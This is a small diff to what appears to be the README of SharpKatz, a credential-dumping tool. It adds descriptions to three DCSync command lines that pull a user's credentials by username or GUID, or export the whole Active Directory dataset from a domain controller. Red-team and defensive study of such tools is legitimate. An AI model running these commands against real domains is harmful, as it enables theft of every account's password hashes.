@@ -34,5 +34,8 @@ Logonpasswords
 DCSync
 
 ```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
+Retrive user credential by username <br>
 ```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
+Retrive user credential by GUID <br>
 ```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
+Export the entire dataset from AD
